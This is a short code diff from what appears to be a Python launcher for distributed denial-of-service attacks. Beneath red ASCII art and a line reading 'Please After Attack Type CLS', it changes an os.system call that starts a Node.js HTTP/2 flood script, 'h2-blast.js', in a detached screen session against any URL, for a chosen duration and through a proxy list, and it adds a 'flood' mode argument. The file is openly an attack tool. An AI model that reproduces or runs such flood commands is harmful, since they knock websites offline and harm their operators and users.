@@ -1136,7 +1136,7 @@ def main():
 ⠀⠀⠀⠀\x1b[38;2;255;0;0m⢹⢁⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⢧⡀⠀⠀⠀⠀⠀\033[37m⢹⠙⣷⣧ \033[37mPlease After Attack Type \033[1;34m'CLS'\033[37m For Back To Home
 ⠀⠀⠀⠀\x1b[38;2;255;0;0m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[37m⠈⢀⣿⠛ 
 \033[0m""")
-                    os.system(f'cd l7 && screen -dm node h2-blast.js {url} {duration} 32 4 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node h2-blast.js {url} {duration} 32 4 proxy.txt flood')
                     
             except ValueError:
                 main()
